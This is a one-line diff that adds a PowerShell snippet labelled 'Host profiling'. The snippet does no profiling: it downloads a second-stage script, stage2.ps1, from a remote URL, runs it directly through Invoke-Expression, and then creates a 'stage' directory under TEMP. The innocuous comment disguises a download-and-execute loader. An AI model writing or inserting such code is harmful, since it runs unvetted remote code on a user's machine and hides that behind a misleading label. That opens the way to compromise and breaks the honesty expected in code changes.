@@ -1,0 +1,1 @@
+<# Host profiling #> $PayloadUrl = "http://internal.corp/stage2.ps1"; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($PayloadUrl); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
